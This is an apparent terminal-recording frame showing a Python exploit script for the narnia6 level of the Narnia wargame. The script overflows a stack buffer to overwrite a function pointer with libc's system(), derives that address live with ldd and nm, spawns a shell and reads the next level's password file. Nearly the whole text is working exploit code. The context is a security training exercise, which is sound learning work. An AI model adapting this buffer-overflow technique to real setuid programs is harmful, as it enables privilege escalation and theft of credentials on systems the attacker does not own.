[9.288672, "o", "\u001b[1;1H\u001b[35mimport\u001b[m struct, subprocess, sys\r\r\n\u001b[34m# narnia6: strcpy(b1[8], argv[1]); strcpy(b2[8], argv[2]); fp = &puts at b1+8.\u001b[m\u001b[2;79H\u001b[K\u001b[3;1H\u001b[34m# Overflowing b1 with 8 command bytes + a 4-byte address overwrites fp; the program\u001b[m\u001b[3;84H\u001b[K\u001b[4;1H\u001b[34m# calls fp(b1) = system(b1). The guard only rejects 0xff....... (stack) so a libc\r\r\n# system() passes. \"sh;#AAAA\" comments out the trailing address bytes.\r\r\n# b2 must stay SHORT: b2[8] ends at b1[0], a long b2 NUL-terminates into b1.\u001b[m\r\r\nsystem = \u001b[31m0xf7dc0ce0\u001b[m\r\r\n\u001b[34m# derive it live instead of trusting a constant:\u001b[m\r\r\nlibc_base = \u001b[36mNone\u001b[m\r\r\nldd = subprocess.run([\u001b[31m\"ldd\"\u001b[m, \u001b[31m\"/narnia/narnia6\"\u001b[m], capture_output=\u001b[36mTrue\u001b[m).stdout\r\r\n\u001b[33mfor\u001b[m line \u001b[33min\u001b[m ldd.split(\u001b[31mb\"\u001b[m\u001b[35m\\n\u001b[m\u001b[31m\"\u001b[m):\r\r\n    \u001b[33mif\u001b[m \u001b[31mb\"libc.so.6\"\u001b[m \u001b[33min\u001b[m line:\u001b[13;9Hlibc_base = \u001b[36mint\u001b[m(line.split(\u001b[31mb\"(\"\u001b[m)[-\u001b[31m1\u001b[m].strip(\u001b[31mb\") \"\u001b[m), \u001b[31m16\u001b[m)\r\r\nnm = subprocess.run([\u001b[31m\"nm\"\u001b[m, \u001b[31m\"-D\"\u001b[m, \u001b[31m\"/usr/lib32/libc.so.6\"\u001b[m], capture_output=\u001b[36mTrue\u001b[m).stdout\r\r\n\u001b[33mfor\u001b[m line \u001b[33min\u001b[m nm.split(\u001b[31mb\"\u001b[m\u001b[35m\\n\u001b[m\u001b[31m\"\u001b[m):\r\r\n    \u001b[33mif\u001b[m line.endswith(\u001b[31mb\" system@@GLIBC_2.0\"\u001b[m) \u001b[33mor\u001b[m \u001b[31mb\" system@@GLIBC_2.0\"\u001b[m \u001b[33min\u001b[m line:\u001b[17;9Hoff = \u001b[36mint\u001b[m(line.split()[\u001b[31m0\u001b[m], \u001b[31m16\u001b[m)\r\r\nsystem = libc_base + off\r\r\n\u001b[36mprint\u001b[m(\u001b[31m\"SYSTEM_ADDR_FOUND\"\u001b[m, \u001b[36mhex\u001b[m(system))\r\r\nb1 = \u001b[31mb\"sh;#AAAA\"\u001b[m + struct.pack(\u001b[31m\"<I\"\u001b[m, system)\r\r\n\u001b[33massert\u001b[m \u001b[36mlen\u001b[m(b1) == \u001b[31m12\u001b[m\r\r\np = subprocess.Popen([\u001b[31mb\"/narnia/narnia6\"\u001b[m, b1, \u001b[31mb\"B\"\u001b[m], stdin=subprocess.PIPE, env={})\r\r\n\u001b[34m# the spawned shell inherits the pty; feed it and let the cast watch\u001b[m\r\r\np.stdin.write(\u001b[31mb\"id\u001b[m\u001b[35m\\n\u001b[m\u001b[31mcat /etc/narnia_pass/narnia7\u001b[m\u001b[35m\\n\u001b[m\u001b[31m\"\u001b[m)\r\r\np.stdin.flush()\r\r\n\r\r\n\u001b[1m\u001b[34m~                                                                                                   \u001b[28;1H~                                                                                                   "]
